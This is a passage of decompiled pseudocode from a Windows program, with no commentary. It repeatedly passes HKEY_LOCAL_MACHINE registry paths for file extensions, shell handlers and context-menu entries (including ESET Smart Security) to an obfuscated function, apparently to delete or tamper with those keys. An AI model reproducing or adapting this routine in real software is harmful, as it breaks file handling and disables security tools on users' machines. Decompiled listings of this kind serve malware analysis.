  loc_00450254: var_9C00 = OnudaSilloA(global_80000002, var_9BFC)
  loc_00450259: call var_9C04 = global_00401054
  loc_00450262: call var_9C08 = global_004011CC
  loc_00450278: call var_9C0C = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellEx\{000214F9-0000-0000-C000-000000000046}")
  loc_00450284: var_9C10 = OnudaSilloA(global_80000002, var_9C0C)
  loc_00450289: call var_9C14 = global_00401054
  loc_00450292: call var_9C18 = global_004011CC
  loc_004502A8: call var_9C1C = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellEx\{00021500-0000-0000-C000-000000000046}")
  loc_004502B4: var_9C20 = OnudaSilloA(global_80000002, var_9C1C)
  loc_004502B9: call var_9C24 = global_00401054
  loc_004502C2: call var_9C28 = global_004011CC
  loc_004502D8: call var_9C2C = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}")
  loc_004502E4: var_9C30 = OnudaSilloA(global_80000002, var_9C2C)
  loc_004502E9: call var_9C34 = global_00401054
  loc_004502F2: call var_9C38 = global_004011CC
  loc_00450308: call var_9C3C = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellEx")
  loc_00450314: var_9C40 = OnudaSilloA(global_80000002, var_9C3C)
  loc_00450319: call var_9C44 = global_00401054
  loc_00450322: call var_9C48 = global_004011CC
  loc_00450338: call var_9C4C = global_00401188(var_24, "SOFTWARE\Classes\.lnk\ShellNew")
  loc_00450344: var_9C50 = OnudaSilloA(global_80000002, var_9C4C)
  loc_00450349: call var_9C54 = global_00401054
  loc_00450352: call var_9C58 = global_004011CC
  loc_00450368: call var_9C5C = global_00401188(var_24, "SOFTWARE\Classes\.lnk")
  loc_00450374: var_9C60 = OnudaSilloA(global_80000002, var_9C5C)
  loc_00450379: call var_9C64 = global_00401054
  loc_00450382: call var_9C68 = global_004011CC
  loc_00450398: call var_9C6C = global_00401188(var_24, "SOFTWARE\Classes\.local")
  loc_004503A4: var_9C70 = OnudaSilloA(global_80000002, var_9C6C)
  loc_004503A9: call var_9C74 = global_00401054
  loc_004503B2: call var_9C78 = global_004011CC
  loc_004503C8: call var_9C7C = global_00401188(var_24, "SOFTWARE\Classes\.log\PersistentHandler")
  loc_004503D4: var_9C80 = OnudaSilloA(global_80000002, var_9C7C)
  loc_004503D9: call var_9C84 = global_00401054
  loc_004503E2: call var_9C88 = global_004011CC
  loc_004503F8: call var_9C8C = global_00401188(var_24, "SOFTWARE\Classes\.log")
  loc_00450404: var_9C90 = OnudaSilloA(global_80000002, var_9C8C)
  loc_00450409: call var_9C94 = global_00401054
  loc_00450412: call var_9C98 = global_004011CC
  loc_00450428: call var_9C9C = global_00401188(var_24, "SOFTWARE\Classes\.lwv")
  loc_00450434: var_9CA0 = OnudaSilloA(global_80000002, var_9C9C)
  loc_00450439: call var_9CA4 = global_00401054
  loc_00450442: call var_9CA8 = global_004011CC
  loc_00450458: call var_9CAC = global_00401188(var_24, "SOFTWARE\Classes\.lzh")
  loc_00450464: var_9CB0 = OnudaSilloA(global_80000002, var_9CAC)
  loc_00450469: call var_9CB4 = global_00401054
  loc_00450472: call var_9CB8 = global_004011CC
  loc_00450488: call var_9CBC = global_00401188(var_24, "SOFTWARE\Classes\.m14\PersistentHandler")
  loc_00450494: var_9CC0 = OnudaSilloA(global_80000002, var_9CBC)
  loc_00450499: call var_9CC4 = global_00401054
  loc_004504A2: call var_9CC8 = global_004011CC
  loc_004504B8: call var_9CCC = global_00401188(var_24, "SOFTWARE\Classes\.m14")
  loc_004504C4: var_9CD0 = OnudaSilloA(global_80000002, var_9CCC)
  loc_004504C9: call var_9CD4 = global_00401054
  loc_004504D2: call var_9CD8 = global_004011CC
  loc_004504E8: call var_9CDC = global_00401188(var_24, "SOFTWARE\Classes\.m1v\OpenWithList\wmplayer.exe")
  loc_004504F4: var_9CE0 = OnudaSilloA(global_80000002, var_9CDC)
  loc_004504F9: call var_9CE4 = global_00401054
  loc_00450502: call var_9CE8 = global_004011CC
  loc_00450518: call var_9CEC = global_00401188(var_24, "SOFTWARE\Classes\.m1v\OpenWithList")
  loc_00450524: var_9CF0 = OnudaSilloA(global_80000002, var_9CEC)
  loc_00450529: call var_9CF4 = global_00401054
  loc_00450532: call var_9CF8 = global_004011CC
  loc_00450548: call var_9CFC = global_00401188(var_24, "SOFTWARE\Classes\.m1v\OpenWithProgIds")
  loc_00450554: var_9D00 = OnudaSilloA(global_80000002, var_9CFC)
  loc_00450559: call var_9D04 = global_00401054
  loc_00450562: call var_9D08 = global_004011CC
  loc_00450578: call var_9D0C = global_00401188(var_24, "SOFTWARE\Classes\.m1v\PersistentHandler")
  loc_00450584: var_9D10 = OnudaSilloA(global_80000002, var_9D0C)
  loc_00450589: call var_9D14 = global_00401054
  loc_00450592: call var_9D18 = global_004011CC
  loc_004505A8: call var_9D1C = global_00401188(var_24, "SOFTWARE\Classes\.m1v")
  loc_004505B4: var_9D20 = OnudaSilloA(global_80000002, var_9D1C)
  loc_004505B9: call var_9D24 = global_00401054
  loc_004505C2: call var_9D28 = global_004011CC
  loc_004505D8: call var_9D2C = global_00401188(var_24, "SOFTWARE\Classes\.m3u\OpenWithList\wmplayer.exe")
  loc_004505E4: var_9D30 = OnudaSilloA(global_80000002, var_9D2C)
  loc_004505E9: call var_9D34 = global_00401054
  loc_004505F2: call var_9D38 = global_004011CC
  loc_00450608: call var_9D3C = global_00401188(var_24, "SOFTWARE\Classes\.m3u\OpenWithList")
  loc_00450614: var_9D40 = OnudaSilloA(global_80000002, var_9D3C)
  loc_00450619: call var_9D44 = global_00401054
  loc_00450622: call var_9D48 = global_004011CC
  loc_00450638: call var_9D4C = global_00401188(var_24, "SOFTWARE\Classes\.m3u\OpenWithProgIds")
  loc_00450644: var_9D50 = OnudaSilloA(global_80000002, var_9D4C)
  loc_00450649: call var_9D54 = global_00401054
  loc_00450652: call var_9D58 = global_004011CC
  loc_00450668: call var_9D5C = global_00401188(var_24, "SOFTWARE\Classes\.m3u\PersistentHandler")
  loc_00450674: var_9D60 = OnudaSilloA(global_80000002, var_9D5C)
  loc_00450679: call var_9D64 = global_00401054
  loc_00450682: call var_9D68 = global_004011CC
  loc_00450698: call var_9D6C = global_00401188(var_24, "SOFTWARE\Classes\.m3u")
  loc_004506A4: var_9D70 = OnudaSilloA(global_80000002, var_9D6C)
  loc_004506A9: call var_9D74 = global_00401054
  loc_004506B2: call var_9D78 = global_004011CC
  loc_004506C8: call var_9D7C = global_00401188(var_24, "SOFTWARE\Classes\.m4a")
  loc_004506D4: var_9D80 = OnudaSilloA(global_80000002, var_9D7C)
  loc_004506D9: call var_9D84 = global_00401054
  loc_004506E2: call var_9D88 = global_004011CC
  loc_004506F8: call var_9D8C = global_00401188(var_24, "SOFTWARE\Classes\.m4v")
  loc_00450704: var_9D90 = OnudaSilloA(global_80000002, var_9D8C)
  loc_00450709: call var_9D94 = global_00401054
  loc_00450712: call var_9D98 = global_004011CC
  loc_00450728: call var_9D9C = global_00401188(var_24, "SOFTWARE\Classes\.man")
  loc_00450734: var_9DA0 = OnudaSilloA(global_80000002, var_9D9C)
  loc_00450739: call var_9DA4 = global_00401054
  loc_00450742: call var_9DA8 = global_004011CC
  loc_00450758: call var_9DAC = global_00401188(var_24, "SOFTWARE\Classes\.manifest")
  loc_00450764: var_9DB0 = OnudaSilloA(global_80000002, var_9DAC)
  loc_00450769: call var_9DB4 = global_00401054
  loc_00450772: call var_9DB8 = global_004011CC
  loc_00450788: call var_9DBC = global_00401188(var_24, "SOFTWARE\Classes\.MAPIMail\PersistentHandler")
  loc_00450794: var_9DC0 = OnudaSilloA(global_80000002, var_9DBC)
  loc_00450799: call var_9DC4 = global_00401054
  loc_004507A2: call var_9DC8 = global_004011CC
  loc_004507B8: call var_9DCC = global_00401188(var_24, "SOFTWARE\Classes\.MAPIMail")
  loc_004507C4: var_9DD0 = OnudaSilloA(global_80000002, var_9DCC)
  loc_004507C9: call var_9DD4 = global_00401054
  loc_004507D2: call var_9DD8 = global_004011CC
  loc_004507E8: call var_9DDC = global_00401188(var_24, "SOFTWARE\Classes\.mdb\PersistentHandler")
  loc_004507F4: var_9DE0 = OnudaSilloA(global_80000002, var_9DDC)
  loc_004507F9: call var_9DE4 = global_00401054
  loc_00450802: call var_9DE8 = global_004011CC
  loc_00450818: call var_9DEC = global_00401188(var_24, "SOFTWARE\Classes\.MAPIMail")
  loc_00450824: var_9DF0 = OnudaSilloA(global_80000002, var_9DEC)
  loc_00450829: call var_9DF4 = global_00401054
  loc_00450832: call var_9DF8 = global_004011CC
  loc_00450848: call var_9DFC = global_00401188(var_24, "SOFTWARE\Classes\.mfp")
  loc_00450854: var_9E00 = OnudaSilloA(global_80000002, var_9DFC)
  loc_00450859: call var_9E04 = global_00401054
  loc_00450862: call var_9E08 = global_004011CC
  loc_00450878: call var_9E0C = global_00401188(var_24, "SOFTWARE\Classes\.mht")
  loc_00450884: var_9E10 = OnudaSilloA(global_80000002, var_9E0C)
  loc_00450889: call var_9E14 = global_00401054
  loc_00450892: call var_9E18 = global_004011CC
  loc_004508A8: call var_9E1C = global_00401188(var_24, "SOFTWARE\Classes\.mhtml")
  loc_004508B4: var_9E20 = OnudaSilloA(global_80000002, var_9E1C)
  loc_004508B9: call var_9E24 = global_00401054
  loc_004508C2: call var_9E28 = global_004011CC
  loc_004508D8: call var_9E2C = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithList\wmplayer.exe")
  loc_004508E4: var_9E30 = OnudaSilloA(global_80000002, var_9E2C)
  loc_004508E9: call var_9E34 = global_00401054
  loc_004508F2: call var_9E38 = global_004011CC
  loc_00450908: call var_9E3C = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithList")
  loc_00450914: var_9E40 = OnudaSilloA(global_80000002, var_9E3C)
  loc_00450919: call var_9E44 = global_00401054
  loc_00450922: call var_9E48 = global_004011CC
  loc_00450938: call var_9E4C = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithProgIds")
  loc_00450944: var_9E50 = OnudaSilloA(global_80000002, var_9E4C)
  loc_00450949: call var_9E54 = global_00401054
  loc_00450952: call var_9E58 = global_004011CC
  loc_00450968: call var_9E5C = global_00401188(var_24, "SOFTWARE\Classes\.mid\PersistentHandler")
  loc_00450974: var_9E60 = OnudaSilloA(global_80000002, var_9E5C)
  loc_00450979: call var_9E64 = global_00401054
  loc_00450982: call var_9E68 = global_004011CC
  loc_00450998: call var_9E6C = global_00401188(var_24, "SOFTWARE\Classes\.mid")
  loc_004509A4: var_9E70 = OnudaSilloA(global_80000002, var_9E6C)
  loc_004509A9: call var_9E74 = global_00401054
  loc_004509B2: call var_9E78 = global_004011CC
  loc_004509C8: call var_9E7C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithList\wmplayer.exe")
  loc_004509D4: var_9E80 = OnudaSilloA(global_80000002, var_9E7C)
  loc_004509D9: call var_9E84 = global_00401054
  loc_004509E2: call var_9E88 = global_004011CC
  loc_004509F8: call var_9E8C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithList")
  loc_00450A04: var_9E90 = OnudaSilloA(global_80000002, var_9E8C)
  loc_00450A09: call var_9E94 = global_00401054
  loc_00450A12: call var_9E98 = global_004011CC
  loc_00450A28: call var_9E9C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithProgIds")
  loc_00450A34: var_9EA0 = OnudaSilloA(global_80000002, var_9E9C)
  loc_00450A39: call var_9EA4 = global_00401054
  loc_00450A42: call var_9EA8 = global_004011CC
  loc_00450A58: call var_9EAC = global_00401188(var_24, "SOFTWARE\Classes\.midi\PersistentHandler")
  loc_00450A64: var_9EB0 = OnudaSilloA(global_80000002, var_9EAC)
  loc_00450A69: call var_9EB4 = global_00401054
  loc_00450A72: call var_9EB8 = global_004011CC
  loc_00450A88: call var_9EBC = global_00401188(var_24, "SOFTWARE\Classes\.midi")
  loc_00450A94: var_9EC0 = OnudaSilloA(global_80000002, var_9EBC)
  loc_00450A99: call var_9EC4 = global_00401054
  loc_00450AA2: call var_9EC8 = global_004011CC
  loc_00450AB8: call var_9ECC = global_00401188(var_24, "SOFTWARE\Classes\.mkv")
  loc_00450AC4: var_9ED0 = OnudaSilloA(global_80000002, var_9ECC)
  loc_00450AC9: call var_9ED4 = global_00401054
  loc_00450AD2: call var_9ED8 = global_004011CC
  loc_00450AE8: call var_9EDC = global_00401188(var_24, "SOFTWARE\Classes\.mmf\PersistentHandler")
  loc_00450AF4: var_9EE0 = OnudaSilloA(global_80000002, var_9EDC)
  loc_00450AF9: call var_9EE4 = global_00401054
  loc_00450B02: call var_9EE8 = global_004011CC
  loc_00450B18: call var_9EEC = global_00401188(var_24, "SOFTWARE\Classes\.mmf")
  loc_00450B24: var_9EF0 = OnudaSilloA(global_80000002, var_9EEC)
  loc_00450B29: call var_9EF4 = global_00401054
  loc_00450B32: call var_9EF8 = global_004011CC
  loc_00450B48: call var_9EFC = global_00401188(var_24, "SOFTWARE\Classes\.mmm")
  loc_00450B54: var_9F00 = OnudaSilloA(global_80000002, var_9EFC)
  loc_00450B59: call var_9F04 = global_00401054
  loc_00450B62: call var_9F08 = global_004011CC
  loc_00450B78: call var_9F0C = global_00401188(var_24, "SOFTWARE\Classes\.mov\PersistentHandler")
  loc_00450B84: var_9F10 = OnudaSilloA(global_80000002, var_9F0C)
  loc_00450B89: call var_9F14 = global_00401054
  loc_00450B92: call var_9F18 = global_004011CC
  loc_00450BA8: call var_9F1C = global_00401188(var_24, "SOFTWARE\Classes\.mov")
  loc_00450BB4: var_9F20 = OnudaSilloA(global_80000002, var_9F1C)
  loc_00450BB9: call var_9F24 = global_00401054
  loc_00450BC2: call var_9F28 = global_004011CC
  loc_00450BD8: call var_9F2C = global_00401188(var_24, "SOFTWARE\Classes\.movie\PersistentHandler")
  loc_00450BE4: var_9F30 = OnudaSilloA(global_80000002, var_9F2C)
  loc_00450BE9: call var_9F34 = global_00401054
  loc_00450BF2: call var_9F38 = global_004011CC
  loc_00450C08: call var_9F3C = global_00401188(var_24, "SOFTWARE\Classes\.movie")
  loc_00450C14: var_9F40 = OnudaSilloA(global_80000002, var_9F3C)
  loc_00450C19: call var_9F44 = global_00401054
  loc_00450C22: call var_9F48 = global_004011CC
  loc_00450C38: call var_9F4C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithList\wmplayer.exe")
  loc_00450C44: var_9F50 = OnudaSilloA(global_80000002, var_9F4C)
  loc_00450C49: call var_9F54 = global_00401054
  loc_00450C52: call var_9F58 = global_004011CC
  loc_00450C68: call var_9F5C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithList")
  loc_00450C74: var_9F60 = OnudaSilloA(global_80000002, var_9F5C)
  loc_00450C79: call var_9F64 = global_00401054
  loc_00450C82: call var_9F68 = global_004011CC
  loc_00450C98: call var_9F6C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\OpenWithProgIds")
  loc_00450CA4: var_9F70 = OnudaSilloA(global_80000002, var_9F6C)
  loc_00450CA9: call var_9F74 = global_00401054
  loc_00450CB2: call var_9F78 = global_004011CC
  loc_00450CC8: call var_9F7C = global_00401188(var_24, "SOFTWARE\Classes\.mp2\PersistentHandler")
  loc_00450CD4: var_9F80 = OnudaSilloA(global_80000002, var_9F7C)
  loc_00450CD9: call var_9F84 = global_00401054
  loc_00450CE2: call var_9F88 = global_004011CC
  loc_00450CF8: call var_9F8C = global_00401188(var_24, "SOFTWARE\Classes\.mp2")
  loc_00450D04: var_9F90 = OnudaSilloA(global_80000002, var_9F8C)
  loc_00450D09: call var_9F94 = global_00401054
  loc_00450D12: call var_9F98 = global_004011CC
  loc_00450D28: call var_9F9C = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\Excel.exe")
  loc_00450D34: var_9FA0 = OnudaSilloA(global_80000002, var_9F9C)
  loc_00450D39: call var_9FA4 = global_00401054
  loc_00450D42: call var_9FA8 = global_004011CC
  loc_00450D58: call var_9FAC = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\IExplore.exe")
  loc_00450D64: var_9FB0 = OnudaSilloA(global_80000002, var_9FAC)
  loc_00450D69: call var_9FB4 = global_00401054
  loc_00450D72: call var_9FB8 = global_004011CC
  loc_00450D88: call var_9FBC = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\Notepad.exe")
  loc_00450D94: var_9FC0 = OnudaSilloA(global_80000002, var_9FBC)
  loc_00450D99: call var_9FC4 = global_00401054
  loc_00450DA2: call var_9FC8 = global_004011CC
  loc_00450DB8: call var_9FCC = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\Winword.exe")
  loc_00450DC4: var_9FD0 = OnudaSilloA(global_80000002, var_9FCC)
  loc_00450DC9: call var_9FD4 = global_00401054
  loc_00450DD2: call var_9FD8 = global_004011CC
  loc_00450DE8: call var_9FDC = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList\WordPad.exe")
  loc_00450DF4: var_9FE0 = OnudaSilloA(global_80000002, var_9FDC)
  loc_00450DF9: call var_9FE4 = global_00401054
  loc_00450E02: call var_9FE8 = global_004011CC
  loc_00450E18: call var_9FEC = global_00401188(var_24, "SOFTWARE\Classes\*\OpenWithList")
  loc_00450E24: var_9FF0 = OnudaSilloA(global_80000002, var_9FEC)
  loc_00450E29: call var_9FF4 = global_00401054
  loc_00450E32: call var_9FF8 = global_004011CC
  loc_00450E48: call var_9FFC = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\{a2a9545d-a0c2-42b4-9708-a0b2badd77c8}")
  loc_00450E54: var_A000 = OnudaSilloA(global_80000002, var_9FFC)
  loc_00450E59: call var_A004 = global_00401054
  loc_00450E62: call var_A008 = global_004011CC
  loc_00450E78: call var_A00C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\ESET Smart Security - Context Menu Shell Extension")
  loc_00450E84: var_A010 = OnudaSilloA(global_80000002, var_A00C)
  loc_00450E89: call var_A014 = global_00401054
  loc_00450E92: call var_A018 = global_004011CC
  loc_00450EA8: call var_A01C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Offline Files")
  loc_00450EB4: var_A020 = OnudaSilloA(global_80000002, var_A01C)
  loc_00450EB9: call var_A024 = global_00401054
  loc_00450EC2: call var_A028 = global_004011CC
  loc_00450ED8: call var_A02C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Open With")
  loc_00450EE4: var_A030 = OnudaSilloA(global_80000002, var_A02C)
  loc_00450EE9: call var_A034 = global_00401054
  loc_00450EF2: call var_A038 = global_004011CC
  loc_00450F08: call var_A03C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Open With EncryptionMenu")
  loc_00450F14: var_A040 = OnudaSilloA(global_80000002, var_A03C)
  loc_00450F19: call var_A044 = global_00401054
  loc_00450F22: call var_A048 = global_004011CC
  loc_00450F38: call var_A04C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\WinRAR")
  loc_00450F44: var_A050 = OnudaSilloA(global_80000002, var_A04C)
  loc_00450F49: call var_A054 = global_00401054
  loc_00450F52: call var_A058 = global_004011CC
  loc_00450F68: call var_A05C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\ContextMenuHandlers")
  loc_00450F74: var_A060 = OnudaSilloA(global_80000002, var_A05C)
  loc_00450F79: call var_A064 = global_00401054
  loc_00450F82: call var_A068 = global_004011CC
  loc_00450F98: call var_A06C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{1F2E5C40-9550-11CE-99D2-00AA006E086C}")
  loc_00450FA4: var_A070 = OnudaSilloA(global_80000002, var_A06C)
  loc_00450FA9: call var_A074 = global_00401054
  loc_00450FB2: call var_A078 = global_004011CC
  loc_00450FC8: call var_A07C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{3EA48300-8CF6-101B-84FB-666CCB9BCD32}")
  loc_00450FD4: var_A080 = OnudaSilloA(global_80000002, var_A07C)
  loc_00450FD9: call var_A084 = global_00401054
  loc_00450FE2: call var_A088 = global_004011CC
  loc_00450FF8: call var_A08C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{883373C3-BF89-11D1-BE35-080036B11A03}")
  loc_00451004: var_A090 = OnudaSilloA(global_80000002, var_A08C)
  loc_00451009: call var_A094 = global_00401054
  loc_00451012: call var_A098 = global_004011CC
  loc_00451028: call var_A09C = global_00401188(var_24, "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\CryptoSignMenu")
  loc_00451034: var_A0A0 = OnudaSilloA(global_80000002, var_A09C)
  loc_00451039: call var_A0A4 = global_00401054
  loc_00451042: call var_A0A8 = global_004011CC
  loc_00451058: call var_A0AC = global_00401188(var_24, "SOFTWARE\Classes\*\shellex")
  loc_00451064: var_A0B0 = OnudaSilloA(global_80000002, var_A0AC)
  loc_00451069: call var_A0B4 = global_00401054
  loc_00451072: call var_A0B8 = global_004011CC
  loc_00451088: call var_A0BC = global_00401188(var_24, "SOFTWARE\Classes\*")
  loc_00451094: var_A0C0 = OnudaSilloA(global_80000002, var_A0BC)
  loc_00451099: call var_A0C4 = global_00401054
  loc_004510A2: call var_A0C8 = global_004011CC
  loc_004510B8: call var_A0CC = global_00401188(var_24, "SOFTWARE\Classes\.3gp2")
  loc_004510C4: var_A0D0 = OnudaSilloA(global_80000002, var_A0CC)
  loc_004510C9: call var_A0D4 = global_00401054
  loc_004510D2: call var_A0D8 = global_004011CC
  loc_004510E8: call var_A0DC = global_00401188(var_24, "SOFTWARE\Classes\.aifc\OpenWithList\wmplayer.exe")
  loc_004510F4: var_A0E0 = OnudaSilloA(global_80000002, var_A0DC)
  loc_004510F9: call var_A0E4 = global_00401054
  loc_00451102: call var_A0E8 = global_004011CC
  loc_00451118: call var_A0EC = global_00401188(var_24, "SOFTWARE\Classes\.aifc\OpenWithList")
  loc_00451124: var_A0F0 = OnudaSilloA(global_80000002, var_A0EC)
  loc_00451129: call var_A0F4 = global_00401054
  loc_00451132: call var_A0F8 = global_004011CC
  loc_00451148: call var_A0FC = global_00401188(var_24, "SOFTWARE\Classes\.aifc\OpenWithProgIds")
  loc_00451154: var_A100 = OnudaSilloA(global_80000002, var_A0FC)
  loc_00451159: call var_A104 = global_00401054
  loc_00451162: call var_A108 = global_004011CC
  loc_00451178: call var_A10C = global_00401188(var_24, "SOFTWARE\Classes\.aifc\PersistentHandler")
  loc_00451184: var_A110 = OnudaSilloA(global_80000002, var_A10C)
  loc_00451189: call var_A114 = global_00401054
  loc_00451192: call var_A118 = global_004011CC
  loc_004511A8: call var_A11C = global_00401188(var_24, "SOFTWARE\Classes\.aifc")
  loc_004511B4: var_A120 = OnudaSilloA(global_80000002, var_A11C)
  loc_004511B9: call var_A124 = global_00401054
  loc_004511C2: call var_A128 = global_004011CC
  loc_004511D8: call var_A12C = global_00401188(var_24, "SOFTWARE\Classes\.asf")
  loc_004511E4: var_A130 = OnudaSilloA(global_80000002, var_A12C)
  loc_004511E9: call var_A134 = global_00401054
  loc_004511F2: call var_A138 = global_004011CC
  loc_00451208: call var_A13C = global_00401188(var_24, "SOFTWARE\Classes\.ctl")
  loc_00451214: var_A140 = OnudaSilloA(global_80000002, var_A13C)
  loc_00451219: call var_A144 = global_00401054
  loc_00451222: call var_A148 = global_004011CC
  loc_00451238: call var_A14C = global_00401188(var_24, "SOFTWARE\Classes\.imc")
  loc_00451244: var_A150 = OnudaSilloA(global_80000002, var_A14C)
  loc_00451249: call var_A154 = global_00401054
  loc_00451252: call var_A158 = global_004011CC
  loc_00451268: call var_A15C = global_00401188(var_24, "SOFTWARE\Classes\.MAPIMail\PersistentHandler")
  loc_00451274: var_A160 = OnudaSilloA(global_80000002, var_A15C)
  loc_00451279: call var_A164 = global_00401054
  loc_00451282: call var_A168 = global_004011CC
  loc_00451298: call var_A16C = global_00401188(var_24, "SOFTWARE\Classes\.MAPIMail")
  loc_004512A4: var_A170 = OnudaSilloA(global_80000002, var_A16C)
  loc_004512A9: call var_A174 = global_00401054
  loc_004512B2: call var_A178 = global_004011CC
  loc_004512C8: call var_A17C = global_00401188(var_24, "SOFTWARE\Classes\.mdb\PersistentHandler")
  loc_004512D4: var_A180 = OnudaSilloA(global_80000002, var_A17C)
  loc_004512D9: call var_A184 = global_00401054
  loc_004512E2: call var_A188 = global_004011CC
  loc_004512F8: call var_A18C = global_00401188(var_24, "SOFTWARE\Classes\.mdb")
  loc_00451304: var_A190 = OnudaSilloA(global_80000002, var_A18C)
  loc_00451309: call var_A194 = global_00401054
  loc_00451312: call var_A198 = global_004011CC
  loc_00451328: call var_A19C = global_00401188(var_24, "SOFTWARE\Classes\.mfp")
  loc_00451334: var_A1A0 = OnudaSilloA(global_80000002, var_A19C)
  loc_00451339: call var_A1A4 = global_00401054
  loc_00451342: call var_A1A8 = global_004011CC
  loc_00451358: call var_A1AC = global_00401188(var_24, "SOFTWARE\Classes\.mht")
  loc_00451364: var_A1B0 = OnudaSilloA(global_80000002, var_A1AC)
  loc_00451369: call var_A1B4 = global_00401054
  loc_00451372: call var_A1B8 = global_004011CC
  loc_00451388: call var_A1BC = global_00401188(var_24, "SOFTWARE\Classes\.mhtml")
  loc_00451394: var_A1C0 = OnudaSilloA(global_80000002, var_A1BC)
  loc_00451399: call var_A1C4 = global_00401054
  loc_004513A2: call var_A1C8 = global_004011CC
  loc_004513B8: call var_A1CC = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithList\wmplayer.exe")
  loc_004513C4: var_A1D0 = OnudaSilloA(global_80000002, var_A1CC)
  loc_004513C9: call var_A1D4 = global_00401054
  loc_004513D2: call var_A1D8 = global_004011CC
  loc_004513E8: call var_A1DC = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithList")
  loc_004513F4: var_A1E0 = OnudaSilloA(global_80000002, var_A1DC)
  loc_004513F9: call var_A1E4 = global_00401054
  loc_00451402: call var_A1E8 = global_004011CC
  loc_00451418: call var_A1EC = global_00401188(var_24, "SOFTWARE\Classes\.mid\OpenWithProgIds")
  loc_00451424: var_A1F0 = OnudaSilloA(global_80000002, var_A1EC)
  loc_00451429: call var_A1F4 = global_00401054
  loc_00451432: call var_A1F8 = global_004011CC
  loc_00451448: call var_A1FC = global_00401188(var_24, "SOFTWARE\Classes\.mid\PersistentHandler")
  loc_00451454: var_A200 = OnudaSilloA(global_80000002, var_A1FC)
  loc_00451459: call var_A204 = global_00401054
  loc_00451462: call var_A208 = global_004011CC
  loc_00451478: call var_A20C = global_00401188(var_24, "SOFTWARE\Classes\.mid")
  loc_00451484: var_A210 = OnudaSilloA(global_80000002, var_A20C)
  loc_00451489: call var_A214 = global_00401054
  loc_00451492: call var_A218 = global_004011CC
  loc_004514A8: call var_A21C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithList\wmplayer.exe")
  loc_004514B4: var_A220 = OnudaSilloA(global_80000002, var_A21C)
  loc_004514B9: call var_A224 = global_00401054
  loc_004514C2: call var_A228 = global_004011CC
  loc_004514D8: call var_A22C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithList")
  loc_004514E4: var_A230 = OnudaSilloA(global_80000002, var_A22C)
  loc_004514E9: call var_A234 = global_00401054
  loc_004514F2: call var_A238 = global_004011CC
  loc_00451508: call var_A23C = global_00401188(var_24, "SOFTWARE\Classes\.midi\OpenWithProgIds")
  loc_00451514: var_A240 = OnudaSilloA(global_80000002, var_A23C)
  loc_00451519: call var_A244 = global_00401054
  loc_00451522: call var_A248 = global_004011CC
  loc_00451538: call var_A24C = global_00401188(var_24, "SOFTWARE\Classes\.midi\PersistentHandler")
  loc_00451544: var_A250 = OnudaSilloA(global_80000002, var_A24C)
  loc_00451549: call var_A254 = global_00401054
  loc_00451552: call var_A258 = global_004011CC
  loc_00451568: call var_A25C = global_00401188(var_24, "SOFTWARE\Classes\.midi")
  loc_00451574: var_A260 = OnudaSilloA(global_80000002, var_A25C)
  loc_00451579: call var_A264 = global_00401054
  loc_00451582: call var_A268 = global_004011CC
  loc_00451598: call var_A26C = global_00401188(var_24, "SOFTWARE\Classes\.mkv")
  loc_004515A4: var_A270 = OnudaSilloA(global_80000002, var_A26C)
  loc_004515A9: call var_A274 = global_00401054
  loc_004515B2: call var_A278 = global_004011CC
  loc_004515C8: call var_A27C = global_00401188(var_24, "SOFTWARE\Classes\.mmf\PersistentHandler")
  loc_004515D4: var_A280 = OnudaSilloA(global_80000002, var_A27C)
  loc_004515D9: call var_A284 = global_00401054
  loc_004515E2: call var_A288 = global_004011CC
  loc_004515F8: call var_A28C = global_00401188(var_24, "SOFTWARE\Classes\.mmf")
  loc_00451604: var_A290 = OnudaSilloA(global_80000002, var_A28C)
  loc_00451609: call var_A294 = global_00401054
  loc_00451612: call var_A298 = global_004011CC
  loc_00451628: call var_A29C = global_00401188(var_24, "SOFTWARE\Classes\.mmm")
  loc_00451634: var_A2A0 = OnudaSilloA(global_80000002, var_A29C)
  loc_00451639: call var_A2A4 = global_00401054
  loc_00451642: call var_A2A8 = global_004011CC
  loc_00451658: call var_A2AC = global_00401188(var_24, "SOFTWARE\Classes\.mov\PersistentHandler")
  loc_00451664: var_A2B0 = OnudaSilloA(global_80000002, var_A2AC)
  loc_00451669: call var_A2B4 = global_00401054
  loc_00451672: call var_A2B8 = global_004011CC
  loc_00451688: call var_A2BC = global_00401188(var_24, "SOFTWARE\Classes\.mov")
  loc_00451694: var_A2C0 = OnudaSilloA(global_80000002, var_A2BC)
